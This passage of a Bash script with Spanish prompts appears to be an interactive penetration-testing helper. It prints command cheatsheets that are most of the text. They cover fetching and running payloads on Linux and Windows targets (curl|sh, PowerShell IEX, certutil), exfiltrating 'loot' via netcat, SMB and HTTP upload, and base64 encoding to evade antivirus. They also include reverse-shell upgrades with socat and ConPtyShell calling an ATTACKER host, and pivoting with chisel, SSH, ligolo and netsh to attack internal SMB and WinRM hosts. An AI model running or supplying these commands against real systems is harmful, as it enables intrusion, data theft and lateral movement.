    echo -e "  ${YELLOW}impacket-smbserver share . -smb2support${NC}"
    echo ""
    echo -e "  ${WHITE}Netcat:${NC}"
    echo -e "  ${YELLOW}nc -lvnp 9001 < archivo.txt${NC}  ${DIM}← enviar${NC}"
    echo ""

    echo -e "  ${LCYAN}${BOLD}--- DESCARGAR EN TARGET LINUX ---${NC}"
    echo ""
    echo -e "  ${YELLOW}wget http://$my_ip/linpeas.sh -O /tmp/linpeas.sh${NC}"
    echo -e "  ${YELLOW}curl http://$my_ip/linpeas.sh -o /tmp/linpeas.sh${NC}"
    echo -e "  ${YELLOW}nc -nv $my_ip 9001 > archivo.txt${NC}"
    echo -e "  ${YELLOW}busybox wget http://$my_ip/archivo${NC}"
    echo ""

    echo -e "  ${LCYAN}${BOLD}--- DESCARGAR EN TARGET WINDOWS ---${NC}"
    echo ""
    echo -e "  ${WHITE}certutil (Cuidado con AV, bueno para descargar DLLs):${NC}"
    echo -e "  ${YELLOW}certutil -urlcache -split -f http://$my_ip/payload.dll \"C:\\Path\\Destino\\payload.dll\"${NC}"
    echo ""
    echo -e "  ${WHITE}PowerShell:${NC}"
    echo -e "  ${YELLOW}iwr -uri http://$my_ip/payload.dll -OutFile \"C:\\Path\\Destino\\payload.dll\"${NC}"
    echo -e "  ${YELLOW}Invoke-WebRequest http://$my_ip/nc.exe -OutFile nc.exe${NC}"
    echo -e "  ${YELLOW}(New-Object Net.WebClient).DownloadFile('http://$my_ip/nc.exe','nc.exe')${NC}"
    echo ""
    echo -e "  ${WHITE}SMB (desde impacket server):${NC}"
    echo -e "  ${YELLOW}copy \\\\\\\\$my_ip\\\\share\\\\nc.exe .${NC}"
    echo ""
    echo -e "  ${WHITE}bitsadmin:${NC}"
    echo -e "  ${YELLOW}bitsadmin /transfer job /download /priority high http://$my_ip/nc.exe C:\\\\temp\\\\nc.exe${NC}"
    echo ""

    echo -e "  ${LCYAN}${BOLD}--- IN-MEMORY (Ejecutar sin tocar disco) ---${NC}"
    echo ""
    echo -e "  ${WHITE}Linux:${NC}     ${YELLOW}curl -sL http://$my_ip/linpeas.sh | sh${NC}  /  ${YELLOW}wget -qO- http://$my_ip/rev.sh | bash${NC}"
    echo -e "  ${WHITE}Windows:${NC}   ${YELLOW}IEX(New-Object Net.WebClient).DownloadString('http://$my_ip/winpeas.exe')${NC}"
    echo ""

    echo -e "  ${LCYAN}${BOLD}--- EXFILTRACI?N (Sacar archivos al Kali) ---${NC}"
    echo ""
    echo -e "  ${WHITE}SMB:${NC}       (Target)  ${YELLOW}copy loot.zip \\\\\\\\$my_ip\\\\share\\\\${NC}"
    echo -e "  ${WHITE}Netcat:${NC}    (Kali)    ${YELLOW}nc -lvnp 9001 > loot.zip${NC}"
    echo -e "             (Target)  ${YELLOW}nc $my_ip 9001 < loot.zip${NC}"
    echo -e "  ${WHITE}Python HTTP:${NC}"
    echo -e "             (Kali)    ${YELLOW}python3 -m uploadserver 8000${NC}"
    echo -e "             (Target)  ${YELLOW}curl -X POST -F 'files=@loot.zip' http://$my_ip:8000/upload${NC}"
    echo ""

    echo -e "  ${LCYAN}${BOLD}--- BASE64 (Bypass AV o Falta de Red) ---${NC}"
    echo ""
    echo -e "  ${WHITE}Kali (Preparar):${NC}    ${YELLOW}base64 payload.exe | tr -d '\\n'${NC}"
    echo -e "  ${WHITE}Target Linux:${NC}       ${YELLOW}echo -n \"BASE64_STRING\" | base64 -d > payload.sh${NC}"
    echo -e "  ${WHITE}Target Windows:${NC}     ${YELLOW}[IO.File]::WriteAllBytes(\"payload.exe\", [Convert]::FromBase64String(\"BASE64_STRING\"))${NC}"
    echo ""

    echo -e "  ${LCYAN}${BOLD}--- PRIVESC SCRIPTS ---${NC}"
    echo ""
    echo -e "  ${WHITE}Linux:${NC}  ${YELLOW}wget http://$my_ip/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh${NC}"
    echo -e "  ${WHITE}Windows:${NC} ${YELLOW}certutil -urlcache -split -f http://$my_ip/winpeas.exe winpeas.exe && winpeas.exe${NC}"
    echo ""

    # Quick serve option
    echo -e "  ${LGREEN}${BOLD}¿Quieres servir archivos ahora?${NC}"
    echo -e "  ${WHITE}[1]${NC} Iniciar python3 http.server en directorio actual (tmux bg)"
    echo -e "  ${WHITE}[2]${NC} Iniciar SMB server en directorio actual (tmux bg)"
    echo -e "  ${WHITE}[b]${NC} Solo ver cheatsheet"
    echo ""
    read -rp "  Option: " srv_choice
    case $srv_choice in
        1) tmux_run "HTTPServer" "python3 -m http.server 80" "" ;;
        2) tmux_run "SMBServer" "impacket-smbserver share $(pwd) -smb2support" "" ;;
    esac

    echo ""; read -rp "  Press ENTER to continue..."
}

# =============================================================================
# -- [B] Stabilize Shell -> TTY Upgrade  ----------------------------------------
# =============================================================================
stabilize_shell() {
    banner
    log_section "ESTABILIZAR SHELL (TTY Upgrade)"

    echo ""
    echo -e "  ${LPURPLE}+----------------------------------------------------------------------+${NC}"
    echo -e "  ${LPURPLE}|  ${BOLD}🔧 ESTABILIZAR REVERSE SHELL${NC}                                       ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|----------------------------------------------------------------------?${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- METODO 1: Python (el mas comun) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${CYAN}1.${NC} ${YELLOW}python3 -c 'import pty;pty.spawn(\"/bin/bash\")'${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${CYAN}2.${NC} ${YELLOW}Ctrl+Z${NC}  ${DIM}(background)${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${CYAN}3.${NC} ${YELLOW}stty raw -echo; fg${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${CYAN}4.${NC} ${YELLOW}export TERM=xterm${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${CYAN}5.${NC} ${YELLOW}stty rows 50 cols 200${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- M?TODO 2: Script (sin python) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${CYAN}1.${NC} ${YELLOW}script /dev/null -c bash${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${CYAN}2.${NC} ${YELLOW}Ctrl+Z${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${CYAN}3.${NC} ${YELLOW}stty raw -echo; fg${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${CYAN}4.${NC} ${YELLOW}export TERM=xterm${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- M?TODO 3: rlwrap (antes de recibir shell) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}rlwrap nc -lvnp 443${NC}  ${DIM}-> ya tienes readline${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- M?TODO 4: socat (full TTY) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Atacante:${NC} ${YELLOW}socat file:\$(tty),raw,echo=0 tcp-listen:4444${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}victima:${NC}  ${YELLOW}socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- ENVIRONMENT FIXES ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}export SHELL=/bin/bash${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${YELLOW}alias ll='ls -la'${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${LCYAN}${BOLD}--- WINDOWS (ConPtyShell) ---${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}Atacante:${NC} ${YELLOW}stty raw -echo; (stty size; cat) | nc -lvnp 3001${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}victima:${NC}  ${YELLOW}IEX(IWR http://ATTACKER/Invoke-ConPtyShell.ps1 -UseBasicParsing)${NC}"
    echo -e "  ${LPURPLE}|${NC}            ${YELLOW}Invoke-ConPtyShell -RemoteIp ATTACKER -RemotePort 3001${NC}"
    echo -e "  ${LPURPLE}+----------------------------------------------------------------------+${NC}"

    echo ""; read -rp "  Presiona ENTER para continuar..."
}

# =============================================================================
# -- [O] Port Forwarding / Pivoting Cheatsheet ---------------------------------
# =============================================================================
portforward_cheatsheet() {
    banner
    log_section "PORT FORWARDING / PIVOTING — Guía Interactiva"

    local my_ip
    my_ip=$(get_attacker_ip)

    echo ""
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${BOLD}🔀 PORT FORWARDING / PIVOTING${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${DIM}Tu IP: $my_ip${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}?Qu? necesitas hacer?${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}[1]${NC} ${LCYAN}Traer un puerto remoto a mi Kali${NC}"
    echo -e "  ${LPURPLE}|${NC}      ${DIM}La victima tiene un servicio en localhost que no puedo ver${NC}"
    echo -e "  ${LPURPLE}|${NC}      ${DIM}Ej: MySQL en 127.0.0.1:3306, web interna en 127.0.0.1:8080${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}[2]${NC} ${LCYAN}Acceder a una red interna completa (PIVOTING)${NC}"
    echo -e "  ${LPURPLE}|${NC}      ${DIM}La victima tiene otra interfaz de red y veo mas maquinas${NC}"
    echo -e "  ${LPURPLE}|${NC}      ${DIM}Ej: victima tiene 10.10.10.0/24 y quiero escanear esa red${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}[3]${NC} ${LCYAN}Doble pivoting (2 saltos)${NC}"
    echo -e "  ${LPURPLE}|${NC}      ${DIM}Ya estoy pivotando y hay OTRA red mas interna${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}[4]${NC} ${LCYAN}Port forward desde Windows (sin SSH)${NC}"
    echo -e "  ${LPURPLE}|${NC}      ${DIM}Estoy en un Windows y necesito redirigir trafico${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${WHITE}[5]${NC} ${LCYAN}Ver cheatsheet completa (referencia rapida)${NC}"
    echo -e "  ${LPURPLE}|${NC}"
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
    echo ""
    read -rp "  $(echo -e "${CYAN}Opción:${NC} ")" piv_opt

    case $piv_opt in
        1) _pivot_local_forward ;;
        2) _pivot_socks_full ;;
        3) _pivot_double ;;
        4) _pivot_windows ;;
        5) _pivot_full_reference ;;
        *) log_warn "Opción no válida." ;;
    esac
}

# -- Escenario 1: Traer un puerto a Kali -------------------------------------
_pivot_local_forward() {
    local my_ip; my_ip=$(get_attacker_ip)

    echo ""
    echo -e "  ${LCYAN}${BOLD}-- ESCENARIO: Traer un puerto remoto a tu Kali --${NC}"
    echo ""
    echo -e "  ${DIM}Ejemplo: La víctima tiene MySQL en 127.0.0.1:3306 que"
    echo -e "  solo escucha en localhost. Tú no puedes acceder directamente.${NC}"
    echo ""
    echo -e "  ${DIM}  Tu Kali ------------ victima (${IP:-TARGET})${NC}"
    echo -e "  ${DIM}  localhost:LPORT  ?---  127.0.0.1:RPORT (servicio oculto)${NC}"
    echo ""

    read -rp "  $(echo -e "${YELLOW}IP de la víctima${NC} [${IP:-TARGET}]: ")" vic_ip
    vic_ip="${vic_ip:-${IP:-TARGET}}"
    read -rp "  $(echo -e "${YELLOW}Puerto del servicio oculto en la víctima${NC} [3306]: ")" rport
    rport="${rport:-3306}"
    read -rp "  $(echo -e "${YELLOW}Puerto local en tu Kali para acceder${NC} [9999]: ")" lport
    lport="${lport:-9999}"

    echo ""
    echo -e "  ${LGREEN}${BOLD}----------------------------------------------------------------${NC}"
    echo -e "  ${LGREEN}${BOLD}  COMANDOS — Copia y pega en orden${NC}"
    echo -e "  ${LGREEN}${BOLD}----------------------------------------------------------------${NC}"
    echo ""

    echo -e "  ${LCYAN}${BOLD}OPCIÓN A — SSH (si tienes creds SSH de la víctima):${NC}"
    echo ""
    echo -e "  ${WHITE}En tu Kali:${NC}"
    echo -e "  ${YELLOW}ssh -L ${lport}:127.0.0.1:${rport} user@${vic_ip}${NC}"
    echo ""
    echo -e "  ${LGREEN}✅ Listo! Ahora accede al servicio en:${NC}"
    echo -e "  ${YELLOW}  → http://127.0.0.1:${lport}${NC}  ${DIM}(si es web)${NC}"
    echo -e "  ${YELLOW}  → mysql -h 127.0.0.1 -P ${lport} -u root${NC}  ${DIM}(si es MySQL)${NC}"

    echo ""
    echo -e "  ${LPURPLE}----------------------------------------------------------${NC}"
    echo ""

    echo -e "  ${LCYAN}${BOLD}OPCIÓN B — CHISEL (si NO tienes SSH):${NC}"
    echo ""
    echo -e "  ${WHITE}Paso 1 — En tu Kali (servidor):${NC}"
    echo -e "  ${YELLOW}./chisel server -p 8888 --reverse${NC}"
    echo ""
    echo -e "  ${WHITE}Paso 2 — En la víctima (cliente):${NC}"
    echo -e "  ${YELLOW}./chisel client ${my_ip}:8888 R:${lport}:127.0.0.1:${rport}${NC}"
    echo ""
    echo -e "  ${LGREEN}✅ Listo! Ahora accede en tu Kali:${NC}"
    echo -e "  ${YELLOW}  → http://127.0.0.1:${lport}${NC}"

    echo ""
    echo -e "  ${DIM}¿No tienes chisel? → Menú principal → [BIN] → opción [21] o [22]${NC}"
    echo ""; read -rp "  Presiona ENTER para continuar..."
}

# -- Escenario 2: Pivoting completo a red interna ----------------------------
_pivot_socks_full() {
    local my_ip; my_ip=$(get_attacker_ip)

    echo ""
    echo -e "  ${LCYAN}${BOLD}-- ESCENARIO: Acceder a una red interna completa --${NC}"
    echo ""
    echo -e "  ${DIM}Ejemplo: Comprometiste una máquina y ves con ifconfig/ipconfig"
    echo -e "  que tiene OTRA interfaz de red (ej: 10.10.10.0/24). Necesitas"
    echo -e "  escanear y atacar esa red desde tu Kali.${NC}"
    echo ""
    echo -e "  ${DIM}  Tu Kali ------ victima (2 interfaces) ------ Red Interna${NC}"
    echo -e "  ${DIM}  $my_ip        eth0: ${IP:-192.168.X.X}            10.10.10.0/24${NC}"
    echo -e "  ${DIM}                 eth1: 10.10.10.1                 +- 10.10.10.20${NC}"
    echo -e "  ${DIM}                                                  +- 10.10.10.10 (DC?)${NC}"
    echo ""

    read -rp "  $(echo -e "${YELLOW}IP de la víctima comprometida${NC} [${IP:-TARGET}]: ")" vic_ip
    vic_ip="${vic_ip:-${IP:-TARGET}}"
    read -rp "  $(echo -e "${YELLOW}Subred interna a pivotar${NC} [10.10.10.0/24]: ")" internal_net
    internal_net="${internal_net:-10.10.10.0/24}"

    echo ""
    echo -e "  ${WHITE}¿Qué herramienta tienes en la víctima?${NC}"
    echo -e "  ${WHITE}[1]${NC} Chisel ${DIM}(lo más fácil y fiable)${NC}"
    echo -e "  ${WHITE}[2]${NC} SSH ${DIM}(si tienes acceso SSH)${NC}"
    echo -e "  ${WHITE}[3]${NC} Ligolo-ng ${DIM}(interfaz TUN, más transparente)${NC}"
    echo ""
    read -rp "  $(echo -e "${CYAN}Herramienta:${NC} ")" tool_opt

    echo ""
    echo -e "  ${LGREEN}${BOLD}----------------------------------------------------------------${NC}"
    echo -e "  ${LGREEN}${BOLD}  PASO A PASO — Sigue en orden${NC}"
    echo -e "  ${LGREEN}${BOLD}----------------------------------------------------------------${NC}"

    case $tool_opt in
        1)
            echo ""
            echo -e "  ${LCYAN}${BOLD}--- CHISEL -> SOCKS Proxy ---${NC}"
            echo ""
            echo -e "  ${LRED}PASO 1 — Descargar chisel:${NC}"
            echo -e "  ${DIM}Si no lo tienes → Menú principal → [BIN] → opciones [21] [22]${NC}"
            echo ""
            echo -e "  ${LRED}PASO 2 — En tu KALI (levantar servidor):${NC}"
            echo -e "  ${YELLOW}./chisel server -p 8888 --reverse${NC}"
            echo ""
            echo -e "  ${LRED}PASO 3 — En la VÍCTIMA (conectar):${NC}"
            echo -e "  ${YELLOW}./chisel client ${my_ip}:8888 R:socks${NC}"
            echo -e "  ${DIM}→ Verás: 'session#1: tun0' — eso significa que el túnel está activo${NC}"
            echo ""
            echo -e "  ${LRED}PASO 4 — Configurar proxychains en KALI:${NC}"
            echo -e "  ${YELLOW}sudo nano /etc/proxychains4.conf${NC}"
            echo -e "  ${DIM}  → Busca la línea 'socks4 127.0.0.1 9050' y COMÉNTALA con #${NC}"
            echo -e "  ${DIM}  → Añade al FINAL del archivo:${NC}"
            echo -e "  ${YELLOW}socks5 127.0.0.1 1080${NC}"
            echo ""
            echo -e "  ${LRED}PASO 5 — ¡Ya puedes acceder a la red interna!${NC}"
            ;;
        2)
            echo ""
            echo -e "  ${LCYAN}${BOLD}--- SSH -> Dynamic SOCKS ---${NC}"
            echo ""
            echo -e "  ${LRED}PASO 1 — En tu KALI:${NC}"
            echo -e "  ${YELLOW}ssh -D 1080 -N -f user@${vic_ip}${NC}"
            echo -e "  ${DIM}  -D 1080 = SOCKS proxy en puerto 1080${NC}"
            echo -e "  ${DIM}  -N = no ejecutar comandos${NC}"
            echo -e "  ${DIM}  -f = enviar a background${NC}"
            echo ""
            echo -e "  ${LRED}PASO 2 — Configurar proxychains en KALI:${NC}"
            echo -e "  ${YELLOW}sudo nano /etc/proxychains4.conf${NC}"
            echo -e "  ${DIM}  → Comentar: #socks4 127.0.0.1 9050${NC}"
            echo -e "  ${DIM}  → Añadir al final:${NC}"
            echo -e "  ${YELLOW}socks5 127.0.0.1 1080${NC}"
            echo ""
            echo -e "  ${LRED}PASO 3 — ¡Ya puedes acceder a la red interna!${NC}"
            ;;
        3)
            echo ""
            echo -e "  ${LCYAN}${BOLD}--- LIGOLO-NG -> TUN Interface ---${NC}"
            echo ""
            echo -e "  ${LRED}PASO 1 — En tu KALI:${NC}"
            echo -e "  ${YELLOW}sudo ip tuntap add user \$(whoami) mode tun dev ligolo${NC}"
            echo -e "  ${YELLOW}sudo ip link set ligolo up${NC}"
            echo -e "  ${YELLOW}./proxy -selfcert -laddr 0.0.0.0:11601${NC}"
            echo ""
            echo -e "  ${LRED}PASO 2 — En la VÍCTIMA:${NC}"
            echo -e "  ${YELLOW}./agent -connect ${my_ip}:11601 -ignore-cert${NC}"
            echo ""
            echo -e "  ${LRED}PASO 3 — En el PROXY (consola ligolo en Kali):${NC}"
            echo -e "  ${YELLOW}session${NC}  ${DIM}← selecciona la sesión (Enter)${NC}"
            echo -e "  ${YELLOW}ifconfig${NC}  ${DIM}← verás las interfaces de la víctima${NC}"
            echo -e "  ${YELLOW}start${NC}  ${DIM}← activa el túnel${NC}"
            echo ""
            echo -e "  ${LRED}PASO 4 — Añadir ruta en KALI (otra terminal):${NC}"
            echo -e "  ${YELLOW}sudo ip route add ${internal_net} dev ligolo${NC}"
            echo ""
            echo -e "  ${LRED}PASO 5 — ¡Acceso directo SIN proxychains!${NC}"
            echo -e "  ${DIM}Ligolo crea una interfaz TUN real, así que:${NC}"
            ;;
    esac

    echo ""
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${BOLD}🎯 AHORA USA ESTOS COMANDOS PARA EXPLORAR LA RED INTERNA${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    if [[ "$tool_opt" == "3" ]]; then
        echo -e "  ${LPURPLE}|${NC}  ${DIM}(Ligolo NO necesita proxychains, los comandos van directo)${NC}"
        echo -e "  ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${WHITE}Descubrir hosts:${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${YELLOW}nmap -sn ${internal_net}${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${WHITE}Escanear puertos:${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${YELLOW}nmap -sT -Pn -p 21,22,80,135,139,443,445,3306,3389,5985 10.10.10.20${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${WHITE}Atacar SMB:${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${YELLOW}$NXC smb 10.10.10.20 -u user -p pass --shares${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${WHITE}Evil-WinRM:${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${YELLOW}evil-winrm -i 10.10.10.20 -u user -p pass${NC}"
    else
        echo -e "  ${LPURPLE}|${NC}  ${DIM}(Todos los comandos van con ${YELLOW}proxychains${DIM} delante)${NC}"
        echo -e "  ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${WHITE}Descubrir hosts (ping no funciona con proxychains):${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${YELLOW}proxychains nmap -sT -Pn -p 445 ${internal_net} --open${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${DIM}-> busca puertos comunes para detectar maquinas activas${NC}"
        echo -e "  ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${WHITE}Escanear puertos de una maquina encontrada:${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${YELLOW}proxychains nmap -sT -Pn -p 21,22,80,135,139,443,445,3306,3389,5985 10.10.10.20${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${DIM}⚠  Usa -sT (TCP connect), NO -sS (SYN). SYN no funciona con proxychains.${NC}"
        echo -e "  ${LPURPLE}|${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${WHITE}Atacar SMB:${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${YELLOW}proxychains $NXC smb 10.10.10.20 -u user -p pass --shares${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${WHITE}Evil-WinRM:${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${YELLOW}proxychains evil-winrm -i 10.10.10.20 -u user -p pass${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${WHITE}Web interna:${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${YELLOW}proxychains curl http://10.10.10.20:8080${NC}"
        echo -e "  ${LPURPLE}|${NC}  ${DIM}O configurar SOCKS en Firefox: Preferences -> Proxy -> SOCKS5 -> 127.0.0.1:1080${NC}"
    fi
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"

    echo ""
    echo -e "  ${DIM}¿Necesitas descargar chisel/ligolo? → [BIN] Binary Arsenal${NC}"
    echo ""; read -rp "  Presiona ENTER para continuar..."
}

# -- Escenario 3: Doble Pivoting ----------------------------------------------
_pivot_double() {
    local my_ip; my_ip=$(get_attacker_ip)

    echo ""
    echo -e "  ${LCYAN}${BOLD}-- ESCENARIO: Doble Pivoting (2 saltos) --${NC}"
    echo ""
    echo -e "  ${DIM}Tu Kali ---- victima 1 ---- victima 2 ---- Red interna 2${NC}"
    echo -e "  ${DIM}$my_ip     Comprometida     Comprometida   No la ves${NC}"
    echo -e "  ${DIM}              Red A             Red B${NC}"
    echo ""

    read -rp "  $(echo -e "${YELLOW}IP de Víctima 1${NC} (la primera que comprometiste): ")" v1_ip
    read -rp "  $(echo -e "${YELLOW}IP de Víctima 2${NC} (la segunda, red interna): ")" v2_ip

    echo ""
    echo -e "  ${LGREEN}${BOLD}----------------------------------------------------------------${NC}"
    echo -e "  ${LGREEN}${BOLD}  DOBLE PIVOTING CON CHISEL — Paso a paso${NC}"
    echo -e "  ${LGREEN}${BOLD}----------------------------------------------------------------${NC}"
    echo ""
    echo -e "  ${LRED}PASO 1 — KALI: Levantar servidor chisel:${NC}"
    echo -e "  ${YELLOW}./chisel server -p 8888 --reverse${NC}"
    echo ""
    echo -e "  ${LRED}PASO 2 — VÍCTIMA 1: Conectar de vuelta a Kali (primer túnel):${NC}"
    echo -e "  ${YELLOW}./chisel client ${my_ip}:8888 R:1080:socks${NC}"
    echo -e "  ${DIM}→ Ahora Kali tiene SOCKS en 127.0.0.1:1080 hacia Red A${NC}"
    echo ""
    echo -e "  ${LRED}PASO 3 — VÍCTIMA 1: Levantar OTRO servidor chisel:${NC}"
    echo -e "  ${YELLOW}./chisel server -p 9001 --reverse &${NC}"
    echo ""
    echo -e "  ${LRED}PASO 4 — VÍCTIMA 2: Conectar a Víctima 1 (segundo túnel):${NC}"
    echo -e "  ${YELLOW}./chisel client ${v1_ip}:9001 R:1081:socks${NC}"
    echo ""
    echo -e "  ${LRED}PASO 5 — KALI: Configurar proxychains con cadena:${NC}"
    echo -e "  ${YELLOW}sudo nano /etc/proxychains4.conf${NC}"
    echo -e "  ${DIM}  → Busca 'strict_chain' y asegúrate de que NO está comentada${NC}"
    echo -e "  ${DIM}  → Comenta 'random_chain' y 'dynamic_chain' si existen${NC}"
    echo -e "  ${DIM}  → Al final del archivo, pon LOS DOS en orden:${NC}"
    echo -e "  ${YELLOW}socks5 127.0.0.1 1080${NC}"
    echo -e "  ${YELLOW}socks5 127.0.0.1 1081${NC}"
    echo ""
    echo -e "  ${LRED}PASO 6 — KALI: Usar normalmente:${NC}"
    echo -e "  ${YELLOW}proxychains nmap -sT -Pn -p 445 ${v2_ip}${NC}"
    echo -e "  ${YELLOW}proxychains evil-winrm -i ${v2_ip} -u admin -p pass${NC}"

    echo ""; read -rp "  Presiona ENTER para continuar..."
}

# -- Escenario 4: Port forward desde Windows ----------------------------------
_pivot_windows() {
    local my_ip; my_ip=$(get_attacker_ip)

    echo ""
    echo -e "  ${LCYAN}${BOLD}-- ESCENARIO: Port Forward desde Windows (sin SSH) --${NC}"
    echo ""

    read -rp "  $(echo -e "${YELLOW}Puerto del servicio a redirigir${NC} [3389]: ")" rport
    rport="${rport:-3389}"
    read -rp "  $(echo -e "${YELLOW}IP del destino final${NC} [127.0.0.1]: ")" dest_ip
    dest_ip="${dest_ip:-127.0.0.1}"
    read -rp "  $(echo -e "${YELLOW}Puerto local para escuchar${NC} [9999]: ")" lport
    lport="${lport:-9999}"

    echo ""
    echo -e "  ${LGREEN}${BOLD}----------------------------------------------------------------${NC}"
    echo -e "  ${LGREEN}${BOLD}  OPCIONES WINDOWS${NC}"
    echo -e "  ${LGREEN}${BOLD}----------------------------------------------------------------${NC}"

    echo ""
    echo -e "  ${LCYAN}${BOLD}--- CHISEL (recomendado) ---${NC}"
    echo -e "  ${WHITE}En tu Kali:${NC}"
    echo -e "  ${YELLOW}./chisel server -p 8888 --reverse${NC}"
    echo -e "  ${WHITE}En el Windows comprometido:${NC}"
    echo -e "  ${YELLOW}chisel.exe client ${my_ip}:8888 R:${lport}:${dest_ip}:${rport}${NC}"
    echo -e "  ${LGREEN}→ Accede desde Kali: 127.0.0.1:${lport}${NC}"

    echo ""
    echo -e "  ${LCYAN}${BOLD}--- NETSH (nativo, requiere admin) ---${NC}"
    echo -e "  ${WHITE}En el Windows comprometido:${NC}"
    echo -e "  ${YELLOW}netsh interface portproxy add v4tov4 listenport=${lport} listenaddress=0.0.0.0 connectport=${rport} connectaddress=${dest_ip}${NC}"
    echo -e "  ${YELLOW}netsh advfirewall firewall add rule name=\"pivot\" dir=in action=allow protocol=tcp localport=${lport}${NC}"
    echo -e "  ${LGREEN}→ Accede desde Kali: IP_WINDOWS:${lport}${NC}"
    echo ""
    echo -e "  ${DIM}Ver reglas:  ${YELLOW}netsh interface portproxy show all${NC}"
    echo -e "  ${DIM}Limpiar:     ${YELLOW}netsh interface portproxy reset${NC}"

    echo ""
    echo -e "  ${LCYAN}${BOLD}--- PLINK (PuTTY CLI, si esta en el Windows) ---${NC}"
    echo -e "  ${YELLOW}plink.exe -l kali -pw PASSWORD -R ${lport}:${dest_ip}:${rport} ${my_ip}${NC}"

    echo ""
    echo -e "  ${LCYAN}${BOLD}--- SOCAT (si lo subiste al Windows) ---${NC}"
    echo -e "  ${YELLOW}socat.exe tcp-l:${lport},fork tcp:${dest_ip}:${rport}${NC}"

    echo ""; read -rp "  Presiona ENTER para continuar..."
}

# -- Escenario 5: Referencia completa -----------------------------------------
_pivot_full_reference() {
    local my_ip; my_ip=$(get_attacker_ip)

    echo ""
    echo -e "  ${LPURPLE}+------------------------------------------------------------------------------${NC}"
    echo -e "  ${LPURPLE}|${NC}  ${BOLD}📖 REFERENCIA rapida -> Todos los comandos${NC}"
    echo -e "  ${LPURPLE}|------------------------------------------------------------------------------${NC}"
    echo ""
    echo -e "  ${LCYAN}${BOLD}--- SSH ---${NC}"
    echo -e "  ${WHITE}Local Forward:${NC}   ${YELLOW}ssh -L LPORT:127.0.0.1:RPORT user@TARGET${NC}"
    echo -e "  ${WHITE}Remote Forward:${NC}  ${YELLOW}ssh -R LPORT:127.0.0.1:RPORT user@KALI${NC}"
    echo -e "  ${WHITE}Dynamic SOCKS:${NC}   ${YELLOW}ssh -D 1080 -N -f user@TARGET${NC}"
    echo ""
    echo -e "  ${LCYAN}${BOLD}--- CHISEL ---${NC}"
    echo -e "  ${WHITE}Server (Kali):${NC}   ${YELLOW}./chisel server -p 8888 --reverse${NC}"
